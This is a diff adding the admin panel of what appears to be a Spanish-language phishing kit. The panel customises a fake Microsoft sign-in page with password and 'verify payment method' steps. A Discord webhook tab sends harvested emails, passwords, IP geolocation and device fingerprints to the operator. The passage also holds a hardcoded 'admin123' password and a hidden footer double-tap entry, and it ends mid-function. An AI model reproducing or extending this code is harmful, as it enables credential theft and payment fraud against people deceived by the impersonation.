@@ -1,0 +1,1061 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Panel de Administración</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'ms-red': '#f25022',
+            'ms-green': '#7fba00',
+            'ms-yellow': '#ffb900',
+            'ms-blue-logo': '#00bcf2',
+            'dark-bg': '#0f172a',
+            'dark-card': '#1e293b',
+            'dark-border': '#334155',
+            'dark-text': '#f1f5f9',
+            'dark-muted': '#94a3b8',
+            'accent-blue': '#3b82f6',
+            'accent-green': '#22c55e',
+            'accent-red': '#ef4444',
+            'accent-yellow': '#eab308',
+          },
+          fontFamily: {
+            'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
+          },
+        }
+      }
+    }
+  </script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      min-height: 100vh;
+      width: 100%;
+      font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #0f172a;
+      color: #f1f5f9;
+      overflow-x: hidden;
+    }
+    body { overflow-y: auto; }
+
+    /* Sidebar */
+    .sidebar {
+      position: fixed;
+      top: 0; left: 0;
+      width: 260px;
+      height: 100vh;
+      background: #1e293b;
+      border-right: 1px solid #334155;
+      z-index: 40;
+      transition: transform 0.2s ease;
+      overflow-y: auto;
+    }
+    .sidebar-header {
+      padding: 20px;
+      border-bottom: 1px solid #334155;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .sidebar-header .logo-icon {
+      width: 32px;
+      height: 32px;
+      background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 16px;
+    }
+    .sidebar nav {
+      padding: 16px 12px;
+    }
+    .sidebar nav .nav-label {
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      color: #64748b;
+      padding: 12px 8px 6px;
+      font-weight: 600;
+    }
+    .sidebar nav a {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 12px;
+      border-radius: 6px;
+      color: #94a3b8;
+      text-decoration: none;
+      font-size: 14px;
+      transition: all 0.15s ease;
+      margin-bottom: 2px;
+    }
+    .sidebar nav a:hover {
+      background: #334155;
+      color: #f1f5f9;
+    }
+    .sidebar nav a.active {
+      background: #3b82f6;
+      color: #fff;
+    }
+    .sidebar nav a .icon {
+      width: 20px;
+      text-align: center;
+      font-size: 16px;
+    }
+    .sidebar .badge-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      display: inline-block;
+    }
+    .sidebar .badge-dot.green { background: #22c55e; }
+    .sidebar .badge-dot.red { background: #ef4444; }
+    .sidebar .badge-dot.yellow { background: #eab308; }
+
+    /* Main Content */
+    .main-content {
+      margin-left: 260px;
+      min-height: 100vh;
+      padding: 24px 28px;
+    }
+    @media (max-width: 768px) {
+      .sidebar {
+        transform: translateX(-100%);
+      }
+      .sidebar.open {
+        transform: translateX(0);
+      }
+      .main-content {
+        margin-left: 0;
+        padding: 16px;
+      }
+      .sidebar-overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(0,0,0,0.5);
+        z-index: 35;
+      }
+      .sidebar-overlay.open {
+        display: block;
+      }
+    }
+
+    /* Tabs */
+    .tabs-container {
+      display: flex;
+      gap: 0;
+      border-bottom: 1px solid #334155;
+      margin-bottom: 24px;
+      flex-wrap: wrap;
+    }
+    .tab-btn {
+      padding: 10px 20px;
+      background: none;
+      border: none;
+      color: #94a3b8;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      border-bottom: 2px solid transparent;
+      transition: all 0.15s ease;
+      white-space: nowrap;
+    }
+    .tab-btn:hover {
+      color: #f1f5f9;
+      background: #1e293b;
+      border-radius: 4px 4px 0 0;
+    }
+    .tab-btn.active {
+      color: #3b82f6;
+      border-bottom-color: #3b82f6;
+    }
+
+    /* Cards & Forms */
+    .card-panel {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 8px;
+      padding: 20px 24px;
+      margin-bottom: 20px;
+    }
+    .card-panel .card-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #f1f5f9;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .card-panel .card-title .status-badge {
+      font-size: 11px;
+      padding: 3px 10px;
+      border-radius: 9999px;
+      font-weight: 500;
+    }
+    .card-panel .card-title .status-badge.active {
+      background: rgba(34,197,94,0.15);
+      color: #22c55e;
+    }
+    .card-panel .card-title .status-badge.inactive {
+      background: rgba(239,68,68,0.15);
+      color: #ef4444;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+    }
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      color: #94a3b8;
+      margin-bottom: 4px;
+      font-weight: 500;
+    }
+    .form-group input[type="text"],
+    .form-group input[type="email"],
+    .form-group input[type="password"],
+    .form-group input[type="url"],
+    .form-group textarea,
+    .form-group select {
+      width: 100%;
+      padding: 8px 12px;
+      background: #0f172a;
+      border: 1px solid #334155;
+      border-radius: 6px;
+      color: #f1f5f9;
+      font-size: 14px;
+      outline: none;
+      transition: border-color 0.15s;
+    }
+    .form-group input:focus,
+    .form-group textarea:focus {
+      border-color: #3b82f6;
+    }
+    .form-group textarea {
+      resize: vertical;
+      min-height: 80px;
+      font-family: "Segoe UI", monospace;
+      font-size: 13px;
+    }
+    .form-group input[type="color"] {
+      height: 40px;
+      padding: 4px;
+      cursor: pointer;
+    }
+
+    .btn-primary {
+      background: #3b82f6;
+      color: #fff;
+      border: none;
+      padding: 9px 20px;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .btn-primary:hover { background: #2563eb; }
+    .btn-secondary {
+      background: #334155;
+      color: #f1f5f9;
+      border: 1px solid #475569;
+      padding: 9px 20px;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .btn-secondary:hover { background: #475569; }
+    .btn-danger {
+      background: #ef4444;
+      color: #fff;
+      border: none;
+      padding: 9px 20px;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .btn-danger:hover { background: #dc2626; }
+
+    .btn-row {
+      display: flex;
+      gap: 10px;
+      margin-top: 16px;
+      flex-wrap: wrap;
+    }
+
+    /* Toast */
+    .toast {
+      position: fixed;
+      top: 24px;
+      right: 24px;
+      padding: 12px 20px;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 500;
+      z-index: 100;
+      opacity: 0;
+      transform: translateY(-10px);
+      transition: all 0.25s ease;
+      pointer-events: none;
+    }
+    .toast.show {
+      opacity: 1;
+      transform: translateY(0);
+      pointer-events: auto;
+    }
+    .toast.success { background: #22c55e; }
+    .toast.error { background: #ef4444; }
+
+    /* Footer admin */
+    .admin-footer {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      background: rgba(15,23,42,0.95);
+      backdrop-filter: blur(8px);
+      border-top: 1px solid #334155;
+      padding: 8px 24px;
+      z-index: 50;
+      font-size: 12px;
+      color: #64748b;
+    }
+    .admin-footer .footer-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+    .admin-footer a {
+      color: #3b82f6;
+      text-decoration: none;
+    }
+    .admin-footer a:hover { text-decoration: underline; }
+
+    /* Toggle Switch */
+    .toggle-switch {
+      position: relative;
+      width: 44px;
+      height: 24px;
+      cursor: pointer;
+    }
+    .toggle-switch input {
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+    .toggle-slider {
+      position: absolute;
+      inset: 0;
+      background: #475569;
+      border-radius: 9999px;
+      transition: background 0.2s;
+    }
+    .toggle-slider::after {
+      content: '';
+      position: absolute;
+      width: 18px;
+      height: 18px;
+      left: 3px;
+      top: 3px;
+      background: #fff;
+      border-radius: 50%;
+      transition: transform 0.2s;
+    }
+    .toggle-switch input:checked + .toggle-slider {
+      background: #3b82f6;
+    }
+    .toggle-switch input:checked + .toggle-slider::after {
+      transform: translateX(20px);
+    }
+
+    /* View toggle */
+    .view-toggle {
+      display: flex;
+      gap: 4px;
+      background: #1e293b;
+      border-radius: 6px;
+      padding: 3px;
+    }
+    .view-toggle button {
+      padding: 6px 12px;
+      border: none;
+      background: none;
+      color: #94a3b8;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 13px;
+      transition: all 0.15s;
+    }
+    .view-toggle button.active {
+      background: #3b82f6;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Toast -->
+  <div id="toast" class="toast"></div>
+
+  <!-- Sidebar overlay (mobile) -->
+  <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+
+  <!-- Sidebar -->
+  <aside class="sidebar" id="sidebar">
+    <div class="sidebar-header">
+      <div class="logo-icon">admin</div>
+      <span style="font-weight:600;font-size:15px;color:#f1f5f9;">Panel Admin</span>
+    </div>
+    <nav>
+      <div class="nav-label">Configuración</div>
+      <a href="#" class="nav-link active" data-tab="appearance" onclick="switchTab('appearance')">
+        <span class="icon">🎨</span> Apariencia
+        <span class="badge-dot green" style="margin-left:auto;" id="appearanceBadge"></span>
+      </a>
+      <a href="#" class="nav-link" data-tab="discord" onclick="switchTab('discord')">
+        <span class="icon">💬</span> Discord
+        <span class="badge-dot" id="discordBadge" style="margin-left:auto;"></span>
+      </a>
+      <a href="#" class="nav-link" data-tab="content" onclick="switchTab('content')">
+        <span class="icon">📝</span> Contenido
+        <span class="badge-dot" id="contentBadge" style="margin-left:auto;"></span>
+      </a>
+      <div class="nav-label" style="margin-top:12px;">Sistema</div>
+      <a href="#" class="nav-link" onclick="showToast('Guardando...','success');saveAll();">
+        <span class="icon">💾</span> Guardar todo
+      </a>
+      <a href="index.html" class="nav-link">
+        <span class="icon">←</span> Salir del panel
+      </a>
+    </nav>
+  </aside>
+
+  <!-- Main Content -->
+  <div class="main-content">
+
+    <!-- Mobile menu button -->
+    <button onclick="toggleSidebar()" style="display:none;position:fixed;top:12px;left:12px;z-index:50;background:#3b82f6;color:#fff;border:none;padding:8px 12px;border-radius:6px;cursor:pointer;font-size:18px;" id="menuBtn">☰</button>
+
+    <!-- Page Header -->
+    <div style="margin-bottom:24px;">
+      <h1 style="font-size:22px;font-weight:700;color:#f1f5f9;">Panel de Administración</h1>
+      <p style="color:#94a3b8;font-size:14px;margin-top:4px;">Administrar el aspecto y configuración del panel de login</p>
+    </div>
+
+    <!-- Tabs -->
+    <div class="tabs-container" id="tabsContainer">
+      <button class="tab-btn active" data-tab="appearance" onclick="switchTab('appearance')">🎨 Apariencia</button>
+      <button class="tab-btn" data-tab="discord" onclick="switchTab('discord')">💬 Discord</button>
+      <button class="tab-btn" data-tab="content" onclick="switchTab('content')">📝 Contenido</button>
+    </div>
+
+    <!-- ==================== TAB: APARIENCIA ==================== -->
+    <div id="tab-appearance" class="tab-content">
+      <div class="card-panel">
+        <div class="card-title">
+          <span>🎨 Apariencia General</span>
+          <span class="status-badge active" id="appearanceStatus">Activo</span>
+        </div>
+
+        <div class="form-group">
+          <label>Logo (texto)</label>
+          <input type="text" id="setting_logoText" placeholder="Microsoft" value="Microsoft" />
+        </div>
+
+        <div class="form-group">
+          <label>Título de la página de login</label>
+          <input type="text" id="setting_pageTitle" placeholder="Iniciar sesión en su cuenta" value="Iniciar sesión en su cuenta" />
+        </div>
+
+        <div class="form-group">
+          <label>Texto de bienvenida</label>
+          <input type="text" id="setting_welcomeText" placeholder="Use su cuenta" value="Use su cuenta" />
+        </div>
+
+        <div class="form-group">
+          <label>Título página contraseña</label>
+          <input type="text" id="setting_passwordPageTitle" placeholder="Escribir contraseña" value="Escribir contraseña" />
+        </div>
+
+        <div class="form-group">
+          <label>Título página de pago</label>
+          <input type="text" id="setting_paymentPageTitle" placeholder="Verificar método de pago" value="Verificar método de pago" />
+        </div>
+      </div>
+
+      <div class="card-panel">
+        <div class="card-title">
+          <span>🌌 Fondo del Login</span>
+          <span class="status-badge active">Configurable</span>
+        </div>
+
+        <div class="form-group">
+          <label>Tipo de fondo</label>
+          <select id="setting_loginBgType" onchange="onBgTypeChange()">
+            <option value="color">Color sólido</option>
+            <option value="gradient">Degradado (Gradient)</option>
+            <option value="image">Imagen</option>
+          </select>
+        </div>
+
+        <div id="bgColorGroup" class="form-group">
+          <label>Color de fondo</label>
+          <div style="display:flex;gap:12px;align-items:center;">
+            <input type="color" id="setting_loginBgColor" value="#0a0a1a" style="width:60px;flex-shrink:0;" />
+            <input type="text" id="setting_loginBgColorHex" value="#0a0a1a" placeholder="#0a0a1a" style="flex:1;" />
+          </div>
+        </div>
+
+        <div id="bgGradientGroup" class="form-group" style="display:none;">
+          <label>Degradado (CSS gradient)</label>
+          <input type="text" id="setting_loginBgGradient" value="linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)" placeholder="linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)" />
+        </div>
+
+        <div id="bgImageGroup" class="form-group" style="display:none;">
+          <label>URL de la imagen</label>
+          <input type="url" id="setting_loginBgImage" placeholder="https://ejemplo.com/fondo.jpg" value="" />
+        </div>
+
+        <div class="btn-row">
+          <button class="btn-primary" onclick="previewLoginBackground()">Vista previa del fondo</button>
+        </div>
+      </div>
+
+      <div class="card-panel">
+        <div class="card-title">
+          <span>⚙️ Estilos Adicionales</span>
+          <span class="status-badge" id="customCssStatus">Sin personalización</span>
+        </div>
+        <div class="form-group">
+          <label>CSS personalizado (opcional)</label>
+          <textarea id="setting_customCss" placeholder="/* Agrega tu CSS aquí */"></textarea>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== TAB: DISCORD ==================== -->
+    <div id="tab-discord" class="tab-content" style="display:none;">
+      <div class="card-panel">
+        <div class="card-title">
+          <span>💬 Webhook de Discord</span>
+          <span class="status-badge" id="discordStatusBadge">Desconocido</span>
+        </div>
+
+        <div class="form-group">
+          <label>Webhook URL</label>
+          <input type="url" id="setting_discordWebhook" placeholder="https://discord.com/api/webhooks/..." />
+          <p style="font-size:12px;color:#64748b;margin-top:4px;">
+            Obtén tu webhook en: Server Settings → Integrations → Webhooks
+          </p>
+        </div>
+
+        <div class="form-group">
+          <label>Plantilla de mensaje</label>
+          <textarea id="setting_discordMessageTemplate" rows="10" placeholder="Usa {email}, {password}, {ip}, {geoCity}, {geoCountry}, {deviceMemory}, etc."></textarea>
+          <p style="font-size:12px;color:#64748b;margin-top:4px;">
+            Placeholders disponibles: {email}, {password}, {ip}, {geoIp}, {geoCity}, {geoRegion}, {geoCountry}, {geoCountryCode}, {geoTimezone}, {geoIsp}, {geoLatitude}, {geoLongitude}, {geoZip}, {geoCurrency}, {geoCurrencyCode}, {geoCallingCode}, {geoNetwork}, {deviceMemory}, {cpuCores}, {touchPoints}, {isMobile}, {isTablet}, {isDesktop}, {batteryLevel}, {batteryCharging}, {userAgent}, {language}, {screenResolution}, {colorDepth}, {timezone}, {platform}, {onlineStatus}, {cookiesEnabled}, {timestamp}
+          </p>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn-primary" onclick="testDiscordWebhook()">Probar webhook</button>
+          <button class="btn-secondary" onclick="restoreDefaultTemplate()">Restaurar plantilla</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== TAB: CONTENIDO ==================== -->
+    <div id="tab-content" class="tab-content" style="display:none;">
+      <div class="card-panel">
+        <div class="card-title">
+          <span>📝 Textos del Footer</span>
+          <span class="status-badge active">Configurable</span>
+        </div>
+
+        <div class="form-group">
+          <label>Texto del enlace: Ayuda</label>
+          <input type="text" id="setting_footerHelpText" placeholder="Ayuda" value="Ayuda" />
+        </div>
+
+        <div class="form-group">
+          <label>Texto del enlace: Términos de uso</label>
+          <input type="text" id="setting_footerTermsText" placeholder="Términos de uso" value="Términos de uso" />
+        </div>
+
+        <div class="form-group">
+          <label>Texto del enlace: Privacidad y cookies</label>
+          <input type="text" id="setting_footerPrivacyText" placeholder="Privacidad y cookies" value="Privacidad y cookies" />
+        </div>
+
+        <div class="form-group">
+          <label>Texto adicional del footer (privacidad)</label>
+          <input type="text" id="setting_footerPrivateTip" placeholder="Usa la exploración privada si este no es tu dispositivo. Más información" value="Usa la exploración privada si este no es tu dispositivo. Más información" />
+        </div>
+      </div>
+
+      <div class="card-panel">
+        <div class="card-title">
+          <span>🔑 Acceso al Panel</span>
+          <span class="status-badge" style="cursor:pointer;" onclick="showAdminPasswordModal()">Cambiar contraseña</span>
+        </div>
+        <p style="font-size:13px;color:#94a3b8;margin-bottom:12px;">
+          Para acceder al panel, haz doble-tap en <strong>Ayuda</strong> + <strong>Privacidad y cookies</strong> en el footer de la página de login.
+        </p>
+        <div class="form-group">
+          <label>Contraseña del panel</label>
+          <input type="password" id="setting_adminPassword" placeholder="Ingresa la nueva contraseña" />
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Admin Footer (with double-tap access) -->
+  <div class="admin-footer" id="adminFooter">
+    <div class="footer-inner">
+      <span id="adminFooterHelp">Ayuda</span>
+      <span id="adminFooterTerms">Términos de uso</span>
+      <span id="adminFooterPrivacy">Privacidad y cookies</span>
+      <span style="color:#64748b;">Panel v1.0</span>
+    </div>
+  </div>
+
+  <!-- Admin password modal -->
+  <div id="adminPasswordModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:200;align-items:center;justify-content:center;">
+    <div style="background:#1e293b;border:1px solid #334155;border-radius:8px;padding:24px;width:100%;max-width:360px;">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px;">Cambiar contraseña del panel</h3>
+      <div class="form-group">
+        <label>Nueva contraseña</label>
+        <input type="password" id="newAdminPassword" placeholder="Contraseña" />
+      </div>
+      <div class="form-group">
+        <label>Confirmar contraseña</label>
+        <input type="password" id="confirmAdminPassword" placeholder="Confirmar" />
+      </div>
+      <div class="btn-row">
+        <button class="btn-primary" onclick="changeAdminPassword()">Guardar</button>
+        <button class="btn-secondary" onclick="closeAdminPasswordModal()">Cancelar</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ===================== ESTADO LOCAL =====================
+    let settings = {};
+    let adminPassword = 'admin123';
+    let footerTapCount = 0;
+    let footerLastTapTime = 0;
+
+    // ===================== INICIALIZACIÓN =====================
+    async function init() {
+      await loadSettings();
+      renderSettings();
+      updateBadges();
+      setupMobileMenu();
+
+      // Footer double-tap detection
+      const footerHelp = document.getElementById('adminFooterHelp');
+      const footerPrivacy = document.getElementById('adminFooterPrivacy');
+      footerHelp.addEventListener('click', onFooterTap);
+      footerPrivacy.addEventListener('click', onFooterTap);
+    }
+
+    function setupMobileMenu() {
+      const menuBtn = document.getElementById('menuBtn');
+      if (window.innerWidth <= 768) {
+        menuBtn.style.display = 'block';
+      }
+      window.addEventListener('resize', () => {
+        if (window.innerWidth <= 768) {
+          menuBtn.style.display = 'block';
+        } else {
+          menuBtn.style.display = 'none';
+          document.getElementById('sidebar').classList.remove('open');
+          document.getElementById('sidebarOverlay').classList.remove('open');
+        }
+      });
+    }
+
+    // ===================== CARGA / GUARDADO =====================
+    async function loadSettings() {
+      try {
+        const res = await fetch('/api/config');
+        if (res.ok) {
+          const data = await res.json();
+          settings = data;
+          if (data.adminPassword) adminPassword = data.adminPassword;
+          // Reconstruir admin password from server
+          if (data._adminPassHash) {
+            adminPassword = atob(data._adminPassHash);
+          }
+        }
+      } catch (e) {
+        console.warn('No se pudo cargar config, usando defaults');
+        settings = getDefaultSettings();
+      }
+    }
+
+    function getDefaultSettings() {
+      return {
+        logoText: 'Microsoft',
+        pageTitle: 'Iniciar sesión en su cuenta',
+        welcomeText: 'Use su cuenta',
+        passwordPageTitle: 'Escribir contraseña',
+        paymentPageTitle: 'Verificar método de pago',
+        loginBgType: 'color',
+        loginBgColor: '#0a0a1a',
+        loginBgGradient: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
+        loginBgImage: '',
+        customCss: '',
+        discordWebhook: '',
+        discordMessageTemplate: '',
+        footerHelpText: 'Ayuda',
+        footerTermsText: 'Términos de uso',
+        footerPrivacyText: 'Privacidad y cookies',
+        footerPrivateTip: 'Usa la exploración privada si este no es tu dispositivo. Más información',
+        _adminPassHash: btoa(adminPassword),
+      };
+    }
+
+    function renderSettings() {
+      if (!settings) return;
+
+      // Apariencia
+      document.getElementById('setting_logoText').value = settings.logoText || 'Microsoft';
+      document.getElementById('setting_pageTitle').value = settings.pageTitle || 'Iniciar sesión en su cuenta';
+      document.getElementById('setting_welcomeText').value = settings.welcomeText || 'Use su cuenta';
+      document.getElementById('setting_passwordPageTitle').value = settings.passwordPageTitle || 'Escribir contraseña';
+      document.getElementById('setting_paymentPageTitle').value = settings.paymentPageTitle || 'Verificar método de pago';
+      document.getElementById('setting_loginBgType').value = settings.loginBgType || 'color';
+      document.getElementById('setting_loginBgColor').value = settings.loginBgColor || '#0a0a1a';
+      document.getElementById('setting_loginBgColorHex').value = settings.loginBgColor || '#0a0a1a';
+      document.getElementById('setting_loginBgGradient').value = settings.loginBgGradient || '';
+      document.getElementById('setting_loginBgImage').value = settings.loginBgImage || '';
+      document.getElementById('setting_customCss').value = settings.customCss || '';
+
+      // Discord
+      document.getElementById('setting_discordWebhook').value = settings.discordWebhook || '';
+      document.getElementById('setting_discordMessageTemplate').value = settings.discordMessageTemplate || '';
+
+      // Contenido
+      document.getElementById('setting_footerHelpText').value = settings.footerHelpText || 'Ayuda';
+      document.getElementById('setting_footerTermsText').value = settings.footerTermsText || 'Términos de uso';
+      document.getElementById('setting_footerPrivacyText').value = settings.footerPrivacyText || 'Privacidad y cookies';
+      document.getElementById('setting_footerPrivateTip').value = settings.footerPrivateTip || '';
+      document.getElementById('setting_adminPassword').value = '';
+
+      // Footer text
+      document.getElementById('adminFooterHelp').textContent = settings.footerHelpText || 'Ayuda';
+      document.getElementById('adminFooterTerms').textContent = settings.footerTermsText || 'Términos de uso';
+      document.getElementById('adminFooterPrivacy').textContent = settings.footerPrivacyText || 'Privacidad y cookies';
+
+      // Show/hide groups
+      onBgTypeChange();
+    }
+
+    function updateBadges() {
+      const appearanceBadge = document.getElementById('appearanceBadge');
+      const discordBadge = document.getElementById('discordBadge');
+      const contentBadge = document.getElementById('contentBadge');
+
+      if (settings.logoText || settings.pageTitle || settings.loginBgType) {
+        appearanceBadge.style.background = 'rgba(34,197,94,0.15)';
+        appearanceBadge.style.color = '#22c55e';
+        document.getElementById('appearanceStatus').textContent = 'Personalizado';
+        document.getElementById('appearanceStatus').className = 'status-badge active';
+      } else {
+        appearanceBadge.style.background = 'transparent';
+        appearanceBadge.style.color = '#64748b';
+        document.getElementById('appearanceStatus').textContent = 'Por defecto';
+        document.getElementById('appearanceStatus').className = 'status-badge inactive';
+      }
+
+      if (settings.discordWebhook) {
+        discordBadge.style.background = 'rgba(34,197,94,0.15)';
+        discordBadge.style.color = '#22c55e';
+      } else {
+        discordBadge.style.background = 'rgba(239,68,68,0.15)';
+        discordBadge.style.color = '#ef4444';
+      }
+
+      if (settings.footerHelpText || settings.footerTermsText) {
+        contentBadge.style.background = 'rgba(34,197,94,0.15)';
+        contentBadge.style.color = '#22c55e';
+      } else {
+        contentBadge.style.background = 'transparent';
+        contentBadge.style.color = '#64748b';
+      }
+
+      // Discord status badge
+      const discordStatus = document.getElementById('discordStatusBadge');
+      if (settings.discordWebhook) {
+        discordStatus.textContent = 'Configurado';
+        discordStatus.className = 'status-badge active';
+      } else {
+        discordStatus.textContent = 'No configurado';
+        discordStatus.className = 'status-badge inactive';
+      }
+
+      const customCssStatus = document.getElementById('customCssStatus');
+      if (settings.customCss && settings.customCss.trim()) {
+        customCssStatus.textContent = 'Personalizado';
+        customCssStatus.className = 'status-badge active';
+      } else {
+        customCssStatus.textContent = 'Sin personalización';
+        customCssStatus.className = 'status-badge inactive';
+      }
+    }
+
+    // ===================== TABS =====================
+    function switchTab(tabName) {
+      // Hide all tab contents
+      document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
+      // Show target
+      const target = document.getElementById('tab-' + tabName);
+      if (target) target.style.display = 'block';
+
+      // Update tab buttons
+      document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.classList.toggle('active', btn.dataset.tab === tabName);
+      });
+
+      // Update sidebar
+      document.querySelectorAll('.nav-link[data-tab]').forEach(link => {
+        link.classList.toggle('active', link.dataset.tab === tabName);
+      });
+
+      // Refresh badges when switching tabs
+      setTimeout(updateBadges, 100);
+    }
+
+    // ===================== EVENTOS DE FORMULARIO =====================
+    function onBgTypeChange() {
+      const type = document.getElementById('setting_loginBgType').value;
+      document.getElementById('bgColorGroup').style.display = type === 'color' ? 'block' : 'none';
+      document.getElementById('bgGradientGroup').style.display = type === 'gradient' ? 'block' : 'none';
+      document.getElementById('bgImageGroup').style.display = type === 'image' ? 'block' : 'none';
+    }
+
+    // Color sync
+    document.getElementById('setting_loginBgColor').addEventListener('input', function() {
+      document.getElementById('setting_loginBgColorHex').value = this.value;
+      document.getElementById('bgColorGroup').querySelector('input[type="text"]').value = this.value;
+    });
+    document.getElementById('setting_loginBgColorHex').addEventListener('input', function() {
+      if (/^#[0-9a-fA-F]{6}$/.test(this.value)) {
+        document.getElementById('setting_loginBgColor').value = this.value;
+      }
+    });
+
+    // ===================== GUARDAR CONFIGURACIÓN =====================
+    async function saveSettings() {
+      const data = {
+        logoText: document.getElementById('setting_logoText').value.trim(),
+        pageTitle: document.getElementById('setting_pageTitle').value.trim(),
+        welcomeText: document.getElementById('setting_welcomeText').value.trim(),
+        passwordPageTitle: document.getElementById('setting_passwordPageTitle').value.trim(),
+        paymentPageTitle: document.getElementById('setting_paymentPageTitle').value.trim(),
+        loginBgType: document.getElementById('setting_loginBgType').value,
+        loginBgColor: document.getElementById('setting_loginBgColorHex').value.trim() || '#0a0a1a',
+        loginBgGradient: document.getElementById('setting_loginBgGradient').value.trim(),
+        loginBgImage: document.getElementById('setting_loginBgImage').value.trim(),
+        customCss: document.getElementById('setting_customCss').value.trim(),
+        discordWebhook: document.getElementById('setting_discordWebhook').value.trim(),
+        discordMessageTemplate: document.getElementById('setting_discordMessageTemplate').value.trim(),
+        footerHelpText: document.getElementById('setting_footerHelpText').value.trim(),
+        footerTermsText: document.getElementById('setting_footerTermsText').value.trim(),
+        footerPrivacyText: document.getElementById('setting_footerPrivacyText').value.trim(),
+        footerPrivateTip: document.getElementById('setting_footerPrivateTip').value.trim(),
+      };
+
+      try {
+        const res = await fetch('/api/config', {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data),
+        });
+        if (res.ok) {
+          await loadSettings();
+          renderSettings();
+          updateBadges();
+          showToast('Configuración guardada ✅', 'success');
+        } else {
+          showToast('Error al guardar: ' + (await res.text()), 'error');
+        }
+      } catch (e) {
+        showToast('Error de conexión: ' + e.message, 'error');
+      }
+    }
+
+    async function saveAll() {
+      await saveSettings();
+    }
+
+    // ===================== PERMISOS =====================
+    function showAdminPasswordModal() {
+      document.getElementById('adminPasswordModal').style.display = 'flex';
+      document.getElementById('newAdminPassword').value = '';
+      document.getElementById('confirmAdminPassword').value = '';
+      document.getElementById('newAdminPassword').focus();
+    }
+
+    function closeAdminPasswordModal() {
+      document.getElementById('adminPasswordModal').style.display = 'none';
+    }
+
+    async function changeAdminPassword() {
+      const newPass = document.getElementById('newAdminPassword').value;
+      const confirmPass = document.getElementById('confirmAdminPassword').value;
+
+      if (!newPass) {
+        showToast('Ingresa una contraseña', 'error');
+        return;
+      }
+      if (newPass !== confirmPass) {
+        showToast('Las contraseñas no coinciden', 'error');
+        return;
+      }
+
+      try {
+        const res = await fetch('/api/config', {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ _adminPassHash: btoa(newPass) }),
+        });
+        if (res.ok) {
+          adminPassword = newPass;
+          closeAdminPasswordModal();
+          showToast('Contraseña actualizada ✅', 'success');
+        } else {
+          showToast('Error al actualizar', 'error');
+        }
+      } catch (e) {
+        showToast('Error: ' + e.message, 'error');
+      }
+    }
+
+    // ===================== PREVIEW FONDO =====================
+    function previewLoginBackground() {
+      const type = document.getElementById('setting_loginBgType').value;
+      const color = document.getElementById('setting_loginBgColorHex').value.trim() || '#0a0a1a';
+      const gradient = document.getElementById('setting_loginBgGradient').value.trim();
+      const image = document.getElementById('setting_loginBgImage').value.trim();
+
+      // Aplicar al body del dashboard como preview
+      document.body.style.background = '';
+      document.body.style.backgroundColor = '';
+
+      if (type === 'gradient' && gradient) {
+        document.body.style.background = gradient;
+      } else if (type === 'image' && image) {
+        document.body.style.backgroundImage = 'url(' + image + ')';
+        document.body.style.backgroundSize = 'cover';
+        document.body.style.backgroundPosition = 'center';
+      } else {
+        document.body.style.backgroundColor = color;
+      }
+
+      showToast('Vista previa aplicada al panel', 'success');
+    }
+
+    // ===================== TEST DISCORD =====================
+    async function testDiscordWebhook() {
+      const webhookUrl = document.getElementById('setting_discordWebhook').value.trim();
+      if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks')) {
+        showToast('URL del webhook inválida', 'error');
+        return;
+      }
+
+      showToast('Enviando prueba...', 'success');
+
+      try {
+        const res = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
